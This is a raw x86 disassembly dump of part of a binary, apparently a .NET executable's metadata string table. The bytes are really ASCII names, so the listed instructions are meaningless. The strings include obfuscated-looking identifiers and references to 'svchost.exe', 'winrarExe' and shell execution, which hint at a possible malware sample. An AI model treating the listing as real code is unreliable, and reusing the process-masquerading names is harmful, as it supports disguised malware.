  40a844:	79 70                	jns    0x40a8b6
  40a846:	65 00 46 72          	add    %al,%gs:0x72(%esi)
  40a84a:	6f                   	outsl  %ds:(%esi),(%dx)
  40a84b:	6d                   	insl   (%dx),%es:(%edi)
  40a84c:	43                   	inc    %ebx
  40a84d:	75 72                	jne    0x40a8c1
  40a84f:	72 65                	jb     0x40a8b6
  40a851:	6e                   	outsb  %ds:(%esi),(%dx)
  40a852:	74 53                	je     0x40a8a7
  40a854:	79 6e                	jns    0x40a8c4
  40a856:	63 68 72             	arpl   %ebp,0x72(%eax)
  40a859:	6f                   	outsl  %ds:(%esi),(%dx)
  40a85a:	6e                   	outsb  %ds:(%esi),(%dx)
  40a85b:	69 7a 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%edx),%edi
  40a862:	43                   	inc    %ebx
  40a863:	6f                   	outsl  %ds:(%esi),(%dx)
  40a864:	6e                   	outsb  %ds:(%esi),(%dx)
  40a865:	74 65                	je     0x40a8cc
  40a867:	78 74                	js     0x40a8dd
  40a869:	4d                   	dec    %ebp
  40a86a:	65 6d                	gs insl (%dx),%es:(%edi)
  40a86c:	62 65 72             	bound  %esp,0x72(%ebp)
  40a86f:	54                   	push   %esp
  40a870:	79 70                	jns    0x40a8e2
  40a872:	65 00 57 69          	add    %dl,%gs:0x69(%edi)
  40a876:	6e                   	outsb  %ds:(%esi),(%dx)
  40a877:	64 6f                	outsl  %fs:(%esi),(%dx)
  40a879:	77 73                	ja     0x40a8ee
  40a87b:	49                   	dec    %ecx
  40a87c:	6d                   	insl   (%dx),%es:(%edi)
  40a87d:	70 65                	jo     0x40a8e4
  40a87f:	72 73                	jb     0x40a8f4
  40a881:	6f                   	outsl  %ds:(%esi),(%dx)
  40a882:	6e                   	outsb  %ds:(%esi),(%dx)
  40a883:	61                   	popa
  40a884:	74 69                	je     0x40a8ef
  40a886:	6f                   	outsl  %ds:(%esi),(%dx)
  40a887:	6e                   	outsb  %ds:(%esi),(%dx)
  40a888:	43                   	inc    %ebx
  40a889:	6f                   	outsl  %ds:(%esi),(%dx)
  40a88a:	6e                   	outsb  %ds:(%esi),(%dx)
  40a88b:	74 65                	je     0x40a8f2
  40a88d:	78 74                	js     0x40a903
  40a88f:	53                   	push   %ebx
  40a890:	65 74 44             	gs je  0x40a8d7
  40a893:	79 6e                	jns    0x40a903
  40a895:	61                   	popa
  40a896:	6d                   	insl   (%dx),%es:(%edi)
  40a897:	69 63 42 61 73 65 00 	imul   $0x657361,0x42(%ebx),%esp
  40a89e:	44                   	inc    %esp
  40a89f:	69 73 70 6f 73 65 00 	imul   $0x65736f,0x70(%ebx),%esi
  40a8a6:	4d                   	dec    %ebp
  40a8a7:	43                   	inc    %ebx
  40a8a8:	4d                   	dec    %ebp
  40a8a9:	6b 65 79 73          	imul   $0x73,0x79(%ebp),%esp
  40a8ad:	56                   	push   %esi
  40a8ae:	6f                   	outsl  %ds:(%esi),(%dx)
  40a8af:	6c                   	insb   (%dx),%es:(%edi)
  40a8b0:	61                   	popa
  40a8b1:	74 69                	je     0x40a91c
  40a8b3:	6c                   	insb   (%dx),%es:(%edi)
  40a8b4:	65 57                	gs push %edi
  40a8b6:	72 69                	jb     0x40a921
  40a8b8:	74 65                	je     0x40a91f
  40a8ba:	00 67 65             	add    %ah,0x65(%edi)
  40a8bd:	74 4e                	je     0x40a90d
  40a8bf:	65 77 45             	gs ja  0x40a907
  40a8c2:	6e                   	outsb  %ds:(%esi),(%dx)
  40a8c3:	75 6d                	jne    0x40a932
  40a8c5:	41                   	inc    %ecx
  40a8c6:	73 73                	jae    0x40a93b
  40a8c8:	65 6d                	gs insl (%dx),%es:(%edi)
  40a8ca:	62 6c 79 41          	bound  %ebp,0x41(%ecx,%edi,2)
  40a8ce:	6c                   	insb   (%dx),%es:(%edi)
  40a8cf:	67 6f                	outsl  %ds:(%si),(%dx)
  40a8d1:	72 69                	jb     0x40a93c
  40a8d3:	74 68                	je     0x40a93d
  40a8d5:	6d                   	insl   (%dx),%es:(%edi)
  40a8d6:	49                   	dec    %ecx
  40a8d7:	64 41                	fs inc %ecx
  40a8d9:	74 74                	je     0x40a94f
  40a8db:	72 69                	jb     0x40a946
  40a8dd:	62 75 74             	bound  %esi,0x74(%ebp)
  40a8e0:	65 00 47 75          	add    %al,%gs:0x75(%edi)
  40a8e4:	69 64 41 74 74 72 69 	imul   $0x62697274,0x74(%ecx,%eax,2),%esp
  40a8eb:	62 
  40a8ec:	75 74                	jne    0x40a962
  40a8ee:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  40a8f3:	75 67                	jne    0x40a95c
  40a8f5:	67 61                	addr16 popa
  40a8f7:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
  40a8fb:	74 74                	je     0x40a971
  40a8fd:	72 69                	jb     0x40a968
  40a8ff:	62 75 74             	bound  %esi,0x74(%ebp)
  40a902:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  40a906:	6d                   	insl   (%dx),%es:(%edi)
  40a907:	56                   	push   %esi
  40a908:	69 73 69 62 6c 65 41 	imul   $0x41656c62,0x69(%ebx),%esi
  40a90f:	74 74                	je     0x40a985
  40a911:	72 69                	jb     0x40a97c
  40a913:	62 75 74             	bound  %esi,0x74(%ebp)
  40a916:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  40a91a:	73 65                	jae    0x40a981
  40a91c:	6d                   	insl   (%dx),%es:(%edi)
  40a91d:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  40a921:	69 74 6c 65 41 74 74 	imul   $0x72747441,0x65(%esp,%ebp,2),%esi
  40a928:	72 
  40a929:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
  40a930:	73 73                	jae    0x40a9a5
  40a932:	65 6d                	gs insl (%dx),%es:(%edi)
  40a934:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  40a938:	72 61                	jb     0x40a99b
  40a93a:	64 65 6d             	fs gs insl (%dx),%es:(%edi)
  40a93d:	61                   	popa
  40a93e:	72 6b                	jb     0x40a9ab
  40a940:	41                   	inc    %ecx
  40a941:	74 74                	je     0x40a9b7
  40a943:	72 69                	jb     0x40a9ae
  40a945:	62 75 74             	bound  %esi,0x74(%ebp)
  40a948:	65 00 54 61 72       	add    %dl,%gs:0x72(%ecx,%eiz,2)
  40a94d:	67 65 74 46          	addr16 gs je 0x40a997
  40a951:	72 61                	jb     0x40a9b4
  40a953:	6d                   	insl   (%dx),%es:(%edi)
  40a954:	65 77 6f             	gs ja  0x40a9c6
  40a957:	72 6b                	jb     0x40a9c4
  40a959:	41                   	inc    %ecx
  40a95a:	74 74                	je     0x40a9d0
  40a95c:	72 69                	jb     0x40a9c7
  40a95e:	62 75 74             	bound  %esi,0x74(%ebp)
  40a961:	65 00 54 72 61       	add    %dl,%gs:0x61(%edx,%esi,2)
  40a966:	6e                   	outsb  %ds:(%esi),(%dx)
  40a967:	73 61                	jae    0x40a9ca
  40a969:	63 74 55 72          	arpl   %esi,0x72(%ebp,%edx,2)
  40a96d:	6c                   	insb   (%dx),%es:(%edi)
  40a96e:	41                   	inc    %ecx
  40a96f:	74 74                	je     0x40a9e5
  40a971:	72 69                	jb     0x40a9dc
  40a973:	62 75 74             	bound  %esi,0x74(%ebp)
  40a976:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  40a97a:	73 65                	jae    0x40a9e1
  40a97c:	6d                   	insl   (%dx),%es:(%edi)
  40a97d:	62 6c 79 46          	bound  %ebp,0x46(%ecx,%edi,2)
  40a981:	69 6c 65 56 65 72 73 	imul   $0x69737265,0x56(%ebp,%eiz,2),%ebp
  40a988:	69 
  40a989:	6f                   	outsl  %ds:(%esi),(%dx)
  40a98a:	6e                   	outsb  %ds:(%esi),(%dx)
  40a98b:	41                   	inc    %ecx
  40a98c:	74 74                	je     0x40aa02
  40a98e:	72 69                	jb     0x40a9f9
  40a990:	62 75 74             	bound  %esi,0x74(%ebp)
  40a993:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  40a997:	73 65                	jae    0x40a9fe
  40a999:	6d                   	insl   (%dx),%es:(%edi)
  40a99a:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  40a99e:	6f                   	outsl  %ds:(%esi),(%dx)
  40a99f:	6e                   	outsb  %ds:(%esi),(%dx)
  40a9a0:	66 69 67 75 72 61    	imul   $0x6172,0x75(%edi),%sp
  40a9a6:	74 69                	je     0x40aa11
  40a9a8:	6f                   	outsl  %ds:(%esi),(%dx)
  40a9a9:	6e                   	outsb  %ds:(%esi),(%dx)
  40a9aa:	41                   	inc    %ecx
  40a9ab:	74 74                	je     0x40aa21
  40a9ad:	72 69                	jb     0x40aa18
  40a9af:	62 75 74             	bound  %esi,0x74(%ebp)
  40a9b2:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  40a9b6:	73 65                	jae    0x40aa1d
  40a9b8:	6d                   	insl   (%dx),%es:(%edi)
  40a9b9:	62 6c 79 44          	bound  %ebp,0x44(%ecx,%edi,2)
  40a9bd:	65 73 63             	gs jae 0x40aa23
  40a9c0:	72 69                	jb     0x40aa2b
  40a9c2:	70 74                	jo     0x40aa38
  40a9c4:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
  40a9cb:	69 62 75 74 65 00 43 	imul   $0x43006574,0x75(%edx),%esp
  40a9d2:	6f                   	outsl  %ds:(%esi),(%dx)
  40a9d3:	6d                   	insl   (%dx),%es:(%edi)
  40a9d4:	70 69                	jo     0x40aa3f
  40a9d6:	6c                   	insb   (%dx),%es:(%edi)
  40a9d7:	61                   	popa
  40a9d8:	74 69                	je     0x40aa43
  40a9da:	6f                   	outsl  %ds:(%esi),(%dx)
  40a9db:	6e                   	outsb  %ds:(%esi),(%dx)
  40a9dc:	52                   	push   %edx
  40a9dd:	65 6c                	gs insb (%dx),%es:(%edi)
  40a9df:	61                   	popa
  40a9e0:	78 61                	js     0x40aa43
  40a9e2:	74 69                	je     0x40aa4d
  40a9e4:	6f                   	outsl  %ds:(%esi),(%dx)
  40a9e5:	6e                   	outsb  %ds:(%esi),(%dx)
  40a9e6:	73 41                	jae    0x40aa29
  40a9e8:	74 74                	je     0x40aa5e
  40a9ea:	72 69                	jb     0x40aa55
  40a9ec:	62 75 74             	bound  %esi,0x74(%ebp)
  40a9ef:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  40a9f3:	73 65                	jae    0x40aa5a
  40a9f5:	6d                   	insl   (%dx),%es:(%edi)
  40a9f6:	62 6c 79 50          	bound  %ebp,0x50(%ecx,%edi,2)
  40a9fa:	72 6f                	jb     0x40aa6b
  40a9fc:	64 75 63             	fs jne 0x40aa62
  40a9ff:	74 41                	je     0x40aa42
  40aa01:	74 74                	je     0x40aa77
  40aa03:	72 69                	jb     0x40aa6e
  40aa05:	62 75 74             	bound  %esi,0x74(%ebp)
  40aa08:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  40aa0c:	73 65                	jae    0x40aa73
  40aa0e:	6d                   	insl   (%dx),%es:(%edi)
  40aa0f:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  40aa13:	6f                   	outsl  %ds:(%esi),(%dx)
  40aa14:	70 79                	jo     0x40aa8f
  40aa16:	72 69                	jb     0x40aa81
  40aa18:	67 68 74 41 74 74    	addr16 push $0x74744174
  40aa1e:	72 69                	jb     0x40aa89
  40aa20:	62 75 74             	bound  %esi,0x74(%ebp)
  40aa23:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  40aa27:	73 65                	jae    0x40aa8e
  40aa29:	6d                   	insl   (%dx),%es:(%edi)
  40aa2a:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  40aa2e:	6f                   	outsl  %ds:(%esi),(%dx)
  40aa2f:	6d                   	insl   (%dx),%es:(%edi)
  40aa30:	70 61                	jo     0x40aa93
  40aa32:	6e                   	outsb  %ds:(%esi),(%dx)
  40aa33:	79 41                	jns    0x40aa76
  40aa35:	74 74                	je     0x40aaab
  40aa37:	72 69                	jb     0x40aaa2
  40aa39:	62 75 74             	bound  %esi,0x74(%ebp)
  40aa3c:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  40aa40:	6e                   	outsb  %ds:(%esi),(%dx)
  40aa41:	74 69                	je     0x40aaac
  40aa43:	6d                   	insl   (%dx),%es:(%edi)
  40aa44:	65 43                	gs inc %ebx
  40aa46:	6f                   	outsl  %ds:(%esi),(%dx)
  40aa47:	6d                   	insl   (%dx),%es:(%edi)
  40aa48:	70 61                	jo     0x40aaab
  40aa4a:	74 69                	je     0x40aab5
  40aa4c:	62 69 6c             	bound  %ebp,0x6c(%ecx)
  40aa4f:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
  40aa56:	69 
  40aa57:	62 75 74             	bound  %esi,0x74(%ebp)
  40aa5a:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  40aa5e:	74 5f                	je     0x40aabf
  40aa60:	55                   	push   %ebp
  40aa61:	73 65                	jae    0x40aac8
  40aa63:	53                   	push   %ebx
  40aa64:	68 65 6c 6c 45       	push   $0x456c6c65
  40aa69:	78 65                	js     0x40aad0
  40aa6b:	63 75 74             	arpl   %esi,0x74(%ebp)
  40aa6e:	65 00 42 79          	add    %al,%gs:0x79(%edx)
  40aa72:	74 65                	je     0x40aad9
  40aa74:	00 77 69             	add    %dh,0x69(%edi)
  40aa77:	6e                   	outsb  %ds:(%esi),(%dx)
  40aa78:	72 61                	jb     0x40aadb
  40aa7a:	72 45                	jb     0x40aac1
  40aa7c:	78 65                	js     0x40aae3
  40aa7e:	00 73 76             	add    %dh,0x76(%ebx)
  40aa81:	63 68 6f             	arpl   %ebp,0x6f(%eax)
  40aa84:	73 74                	jae    0x40aafa
  40aa86:	2e 65 78 65          	cs js,pn 0x40aaef
  40aa8a:	00 67 65             	add    %ah,0x65(%edi)
  40aa8d:	74 4b                	je     0x40aada
  40aa8f:	65 79 53             	gs jns 0x40aae5
  40aa92:	70 65                	jo     0x40aaf9
  40aa94:	63 67 65             	arpl   %esp,0x65(%edi)
  40aa97:	74 43                	je     0x40aadc
  40aa99:	75 72                	jne    0x40ab0d
  40aa9b:	73 6f                	jae    0x40ab0c
  40aa9d:	72 53                	jb     0x40aaf2
  40aa9f:	69 7a 65 00 67 65 74 	imul   $0x74656700,0x65(%edx),%edi
  40aaa6:	44                   	inc    %esp
  40aaa7:	65 66 61             	gs popaw
  40aaaa:	75 6c                	jne    0x40ab18
  40aaac:	74 52                	je     0x40ab00
  40aaae:	65 71 75             	gs jno 0x40ab26
  40aab1:	65 73 74             	gs jae 0x40ab28
  40aab4:	53                   	push   %ebx
  40aab5:	65 74 67             	gs je  0x40ab1f
  40aab8:	65 74 55             	gs je  0x40ab10
  40aabb:	73 65                	jae    0x40ab22
  40aabd:	4e                   	dec    %esi
  40aabe:	65 77 4d             	gs ja  0x40ab0e
  40aac1:	61                   	popa
  40aac2:	78 41                	js     0x40ab05
  40aac4:	72 72                	jb     0x40ab38
  40aac6:	61                   	popa
  40aac7:	79 53                	jns    0x40ab1c
  40aac9:	69 7a 65 00 49 73 4e 	imul   $0x4e734900,0x65(%edx),%edi
  40aad0:	65 73 74             	gs jae 0x40ab47
  40aad3:	65 64 50             	gs fs push %eax
  40aad6:	75 62                	jne    0x40ab3a
  40aad8:	6c                   	insb   (%dx),%es:(%edi)
  40aad9:	69 63 53 45 50 44 61 	imul   $0x61445045,0x53(%ebx),%esp
  40aae0:	79 53                	jns    0x40ab35
  40aae2:	75 66                	jne    0x40ab4a
  40aae4:	66 00 53 79          	data16 add %dl,0x79(%ebx)
  40aae8:	73 74                	jae    0x40ab5e
  40aaea:	65 6d                	gs insl (%dx),%es:(%edi)
  40aaec:	2e 52                	cs push %edx
  40aaee:	75 6e                	jne    0x40ab5e
  40aaf0:	74 69                	je     0x40ab5b
  40aaf2:	6d                   	insl   (%dx),%es:(%edi)
  40aaf3:	65 2e 56             	gs cs push %esi
  40aaf6:	65 72 73             	gs jb  0x40ab6c
  40aaf9:	69 6f 6e 69 6e 67 00 	imul   $0x676e69,0x6e(%edi),%ebp
  40ab00:	41                   	inc    %ecx
  40ab01:	72 65                	jb     0x40ab68
  40ab03:	54                   	push   %esp
  40ab04:	65 78 74             	gs js  0x40ab7b
  40ab07:	75 61                	jne    0x40ab6a
  40ab09:	6c                   	insb   (%dx),%es:(%edi)
  40ab0a:	52                   	push   %edx
  40ab0b:	65 66 65 72 65       	gs data16 gs jb 0x40ab75
  40ab10:	6e                   	outsb  %ds:(%esi),(%dx)
  40ab11:	63 65 73             	arpl   %esp,0x73(%ebp)
  40ab14:	45                   	inc    %ebp
  40ab15:	71 75                	jno    0x40ab8c
  40ab17:	61                   	popa
  40ab18:	6c                   	insb   (%dx),%es:(%edi)
  40ab19:	47                   	inc    %edi
  40ab1a:	65 74 52             	gs je  0x40ab6f
  40ab1d:	65 73 6f             	gs jae 0x40ab8f
  40ab20:	75 72                	jne    0x40ab94
  40ab22:	63 65 53             	arpl   %esp,0x53(%ebp)
  40ab25:	74 72                	je     0x40ab99
  40ab27:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  40ab2e:	5f                   	pop    %edi
  40ab2f:	45                   	inc    %ebp
  40ab30:	72 72                	jb     0x40aba4
  40ab32:	6f                   	outsl  %ds:(%esi),(%dx)
  40ab33:	72 44                	jb     0x40ab79
  40ab35:	69 61 6c 6f 67 00 47 	imul   $0x4700676f,0x6c(%ecx),%esp
  40ab3c:	65 74 54             	gs je  0x40ab93
  40ab3f:	65 6d                	gs insl (%dx),%es:(%edi)
  40ab41:	70 50                	jo     0x40ab93
  40ab43:	61                   	popa
  40ab44:	74 68                	je     0x40abae
  40ab46:	00 72 61             	add    %dh,0x61(%edx)
  40ab49:	72 50                	jb     0x40ab9b
  40ab4b:	61                   	popa
  40ab4c:	74 68                	je     0x40abb6
  40ab4e:	00 43 4f             	add    %al,0x4f(%ebx)
  40ab51:	46                   	inc    %esi
  40ab52:	69 6c 65 49 6d 70 6f 	imul   $0x726f706d,0x49(%ebp,%eiz,2),%ebp
  40ab59:	72 
  40ab5a:	74 50                	je     0x40abac
  40ab5c:	61                   	popa
  40ab5d:	74 68                	je     0x40abc7
  40ab5f:	00 41 72             	add    %al,0x72(%ecx)
  40ab62:	63 68 69             	arpl   %ebp,0x69(%eax)
  40ab65:	76 61                	jbe    0x40abc8
  40ab67:	62 6c 65 54          	bound  %ebp,0x54(%ebp,%eiz,2)
  40ab6b:	72 69                	jb     0x40abd6
  40ab6d:	6d                   	insl   (%dx),%es:(%edi)
  40ab6e:	43                   	inc    %ebx
  40ab6f:	68 65 63 6b 00       	push   $0x6b6365
  40ab74:	4d                   	dec    %ebp
  40ab75:	61                   	popa
  40ab76:	6b 65 52 65          	imul   $0x65,0x52(%ebp),%esp
  40ab7a:	61                   	popa
  40ab7b:	64 4f                	fs dec %edi
  40ab7d:	6e                   	outsb  %ds:(%esi),(%dx)
  40ab7e:	6c                   	insb   (%dx),%es:(%edi)
  40ab7f:	79 4d                	jns    0x40abce
  40ab81:	79 52                	jns    0x40abd5
  40ab83:	65 61                	gs popa
  40ab85:	64 65 72 57          	fs gs jb 0x40abe0
  40ab89:	72 69                	jb     0x40abf4
  40ab8b:	74 65                	je     0x40abf2
  40ab8d:	72 4c                	jb     0x40abdb
  40ab8f:	6f                   	outsl  %ds:(%esi),(%dx)
  40ab90:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  40ab93:	55                   	push   %ebp
  40ab94:	73 65                	jae    0x40abfb
  40ab96:	41                   	inc    %ecx
  40ab97:	72 63                	jb     0x40abfc
  40ab99:	68 69 76 61 62       	push   $0x62617669
  40ab9e:	6c                   	insb   (%dx),%es:(%edi)
  40ab9f:	65 4b                	gs dec %ebx
  40aba1:	65 79 49             	gs jns 0x40abed
  40aba4:	73 4c                	jae    0x40abf2
  40aba6:	69 74 65 72 61 6c 00 	imul   $0x49006c61,0x72(%ebp,%eiz,2),%esi
  40abad:	49 
  40abae:	6e                   	outsb  %ds:(%esi),(%dx)
  40abaf:	74 65                	je     0x40ac16
  40abb1:	72 6e                	jb     0x40ac21
  40abb3:	65 74 53             	gs je  0x40ac09
  40abb6:	69 74 65 41 75 74 68 	imul   $0x6f687475,0x41(%ebp,%eiz,2),%esi
  40abbd:	6f 
  40abbe:	72 69                	jb     0x40ac29
  40abc0:	74 79                	je     0x40ac3b
  40abc2:	41                   	inc    %ecx
  40abc3:	75 74                	jne    0x40ac39
  40abc5:	6f                   	outsl  %ds:(%esi),(%dx)
  40abc6:	44                   	inc    %esp
  40abc7:	75 61                	jne    0x40ac2a
  40abc9:	6c                   	insb   (%dx),%es:(%edi)
  40abca:	00 42 69             	add    %al,0x69(%edx)
  40abcd:	6e                   	outsb  %ds:(%esi),(%dx)
  40abce:	64 52                	fs push %edx
  40abd0:	65 66 65 72 65       	gs data16 gs jb 0x40ac3a
  40abd5:	6e                   	outsb  %ds:(%esi),(%dx)
  40abd6:	63 65 54             	arpl   %esp,0x54(%ebp)
  40abd9:	6f                   	outsl  %ds:(%esi),(%dx)
  40abda:	41                   	inc    %ecx
  40abdb:	73 73                	jae    0x40ac50
  40abdd:	65 6d                	gs insl (%dx),%es:(%edi)
  40abdf:	62 6c 79 4d          	bound  %ebp,0x4d(%ecx,%edi,2)
  40abe3:	61                   	popa
  40abe4:	6e                   	outsb  %ds:(%esi),(%dx)
  40abe5:	69 66 65 73 74 49 67 	imul   $0x67497473,0x65(%esi),%esp
  40abec:	6e                   	outsb  %ds:(%esi),(%dx)
  40abed:	6f                   	outsl  %ds:(%esi),(%dx)
  40abee:	72 61                	jb     0x40ac51
  40abf0:	62 6c 65 53          	bound  %ebp,0x53(%ebp,%eiz,2)
  40abf4:	79 6d                	jns    0x40ac63
  40abf6:	62 6f 6c             	bound  %ebp,0x6c(%edi)
  40abf9:	00 4d 65             	add    %cl,0x65(%ebp)
  40abfc:	74 61                	je     0x40ac5f
  40abfe:	64 61                	fs popa
  40ac00:	74 61                	je     0x40ac63
  40ac02:	53                   	push   %ebx
  40ac03:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  40ac08:	6e                   	outsb  %ds:(%esi),(%dx)
  40ac09:	4d                   	dec    %ebp
  40ac0a:	61                   	popa
  40ac0b:	6e                   	outsb  %ds:(%esi),(%dx)
  40ac0c:	69 66 65 73 74 46 6c 	imul   $0x6c467473,0x65(%esi),%esp
  40ac13:	61                   	popa
  40ac14:	67 73 45             	addr16 jae 0x40ac5c
  40ac17:	6e                   	outsb  %ds:(%esi),(%dx)
  40ac18:	75 6d                	jne    0x40ac87
  40ac1a:	4f                   	dec    %edi
  40ac1b:	62 6a 65             	bound  %ebp,0x65(%edx)
  40ac1e:	63 74 50 61          	arpl   %esi,0x61(%eax,%edx,2)
  40ac22:	72 61                	jb     0x40ac85
  40ac24:	6d                   	insl   (%dx),%es:(%edi)
  40ac25:	00 53 79             	add    %dl,0x79(%ebx)
  40ac28:	73 74                	jae    0x40ac9e
  40ac2a:	65 6d                	gs insl (%dx),%es:(%edi)
  40ac2c:	00 53 65             	add    %dl,0x65(%ebx)
  40ac2f:	74 43                	je     0x40ac74
  40ac31:	61                   	popa
  40ac32:	6e                   	outsb  %ds:(%esi),(%dx)
  40ac33:	63 65 6c             	arpl   %esp,0x6c(%ebp)
  40ac36:	65 64 47             	gs fs inc %edi
  40ac39:	65 74 43             	gs je  0x40ac7f
  40ac3c:	68 65 63 6b 53       	push   $0x536b6365
  40ac41:	75 6d                	jne    0x40acb0
  40ac43:	00 42 6f             	add    %al,0x6f(%edx)
  40ac46:	6f                   	outsl  %ds:(%esi),(%dx)
  40ac47:	6c                   	insb   (%dx),%es:(%edi)
  40ac48:	65 61                	gs popa
  40ac4a:	6e                   	outsb  %ds:(%esi),(%dx)
  40ac4b:	00 53 79             	add    %dl,0x79(%ebx)
  40ac4e:	6e                   	outsb  %ds:(%esi),(%dx)
  40ac4f:	63 53 6f             	arpl   %edx,0x6f(%ebx)
  40ac52:	72 74                	jb     0x40acc8
  40ac54:	65 64 4c             	gs fs dec %esp
  40ac57:	69 73 74 4d 65 74 61 	imul   $0x6174654d,0x74(%ebx),%esi
  40ac5e:	64 61                	fs popa
  40ac60:	74 61                	je     0x40acc3
  40ac62:	53                   	push   %ebx
  40ac63:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  40ac68:	6e                   	outsb  %ds:(%esi),(%dx)
  40ac69:	52                   	push   %edx
  40ac6a:	75 6e                	jne    0x40acda
  40ac6c:	74 69                	je     0x40acd7
  40ac6e:	6d                   	insl   (%dx),%es:(%edi)
  40ac6f:	65 49                	gs dec %ecx
  40ac71:	6d                   	insl   (%dx),%es:(%edi)
  40ac72:	61                   	popa
  40ac73:	67 65 56             	addr16 gs push %esi
  40ac76:	65 72 73             	gs jb  0x40acec
  40ac79:	69 6f 6e 00 4c 64 69 	imul   $0x69644c00,0x6e(%edi),%ebp
  40ac80:	6e                   	outsb  %ds:(%esi),(%dx)
  40ac81:	64 52                	fs push %edx
  40ac83:	52                   	push   %edx
  40ac84:	65 6d                	gs insl (%dx),%es:(%edi)
  40ac86:	6f                   	outsl  %ds:(%esi),(%dx)
  40ac87:	76 65                	jbe    0x40acee
  40ac89:	50                   	push   %eax
  40ac8a:	65 72 6d             	gs jb  0x40acfa
  40ac8d:	69 73 73 69 6f 6e 00 	imul   $0x6e6f69,0x73(%ebx),%esi
  40ac94:	53                   	push   %ebx
  40ac95:	79 73                	jns    0x40ad0a
  40ac97:	74 65                	je     0x40acfe
  40ac99:	6d                   	insl   (%dx),%es:(%edi)
  40ac9a:	2e 52                	cs push %edx
  40ac9c:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
  40ac9f:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  40aca4:	6e                   	outsb  %ds:(%esi),(%dx)
  40aca5:	00 46 69             	add    %al,0x69(%esi)
  40aca8:	6c                   	insb   (%dx),%es:(%edi)
  40aca9:	65 4e                	gs dec %esi
  40acab:	6f                   	outsl  %ds:(%esi),(%dx)
  40acac:	74 46                	je     0x40acf4
  40acae:	6f                   	outsl  %ds:(%esi),(%dx)
  40acaf:	75 6e                	jne    0x40ad1f
  40acb1:	64 45                	fs inc %ebp
  40acb3:	78 63                	js     0x40ad18
  40acb5:	65 70 74             	gs jo  0x40ad2c
  40acb8:	69 6f 6e 00 4e 65 73 	imul   $0x73654e00,0x6e(%edi),%ebp
  40acbf:	74 65                	je     0x40ad26
  40acc1:	64 50                	fs push %eax
  40acc3:	75 62                	jne    0x40ad27
  40acc5:	6c                   	insb   (%dx),%es:(%edi)
  40acc6:	69 63 43 61 6e 43 61 	imul   $0x61436e61,0x43(%ebx),%esp
  40accd:	73 74                	jae    0x40ad43
  40accf:	54                   	push   %esp
  40acd0:	6f                   	outsl  %ds:(%esi),(%dx)
  40acd1:	00 54 58 4e          	add    %dl,0x4e(%eax,%ebx,2)
  40acd5:	45                   	inc    %ebp
  40acd6:	78 74                	js     0x40ad4c
  40acd8:	72 61                	jb     0x40ad3b
  40acda:	49                   	dec    %ecx
  40acdb:	6e                   	outsb  %ds:(%esi),(%dx)
  40acdc:	66 6f                	outsw  %ds:(%esi),(%dx)
  40acde:	00 50 72             	add    %dl,0x72(%eax)
  40ace1:	6f                   	outsl  %ds:(%esi),(%dx)
  40ace2:	63 65 73             	arpl   %esp,0x73(%ebp)
  40ace5:	73 53                	jae    0x40ad3a
  40ace7:	74 61                	je     0x40ad4a
  40ace9:	72 74                	jb     0x40ad5f
  40aceb:	49                   	dec    %ecx
  40acec:	6e                   	outsb  %ds:(%esi),(%dx)
  40aced:	66 6f                	outsw  %ds:(%esi),(%dx)
  40acef:	00 44 69 72          	add    %al,0x72(%ecx,%ebp,2)
  40acf3:	65 63 74 6f 72       	arpl   %esi,%gs:0x72(%edi,%ebp,2)
  40acf8:	79 49                	jns    0x40ad43
  40acfa:	6e                   	outsb  %ds:(%esi),(%dx)
  40acfb:	66 6f                	outsw  %ds:(%esi),(%dx)
  40acfd:	00 43 68             	add    %al,0x68(%ebx)
  40ad00:	61                   	popa
  40ad01:	72 00                	jb     0x40ad03
  40ad03:	67 65 74 58          	addr16 gs je 0x40ad5f
  40ad07:	6d                   	insl   (%dx),%es:(%edi)
  40ad08:	6c                   	insb   (%dx),%es:(%edi)
  40ad09:	4e                   	dec    %esi
  40ad0a:	61                   	popa
  40ad0b:	6d                   	insl   (%dx),%es:(%edi)
  40ad0c:	65 53                	gs push %ebx
  40ad0e:	70 61                	jo     0x40ad71
  40ad10:	63 65 43             	arpl   %esp,0x43(%ebp)
  40ad13:	6f                   	outsl  %ds:(%esi),(%dx)
  40ad14:	64 65 50             	fs gs push %eax
  40ad17:	61                   	popa
  40ad18:	67 65 48             	addr16 gs dec %eax
  40ad1b:	65 61                	gs popa
  40ad1d:	64 65 72 00          	fs gs jb 0x40ad21
  40ad21:	52                   	push   %edx
  40ad22:	65 6d                	gs insl (%dx),%es:(%edi)
  40ad24:	6f                   	outsl  %ds:(%esi),(%dx)
  40ad25:	76 65                	jbe    0x40ad8c
  40ad27:	50                   	push   %eax
  40ad28:	65 72 6d             	gs jb  0x40ad98
  40ad2b:	69 73 73 69 6f 6e 53 	imul   $0x536e6f69,0x73(%ebx),%esi
  40ad32:	74 72                	je     0x40ada6
  40ad34:	65 61                	gs popa
  40ad36:	6d                   	insl   (%dx),%es:(%edi)
  40ad37:	54                   	push   %esp
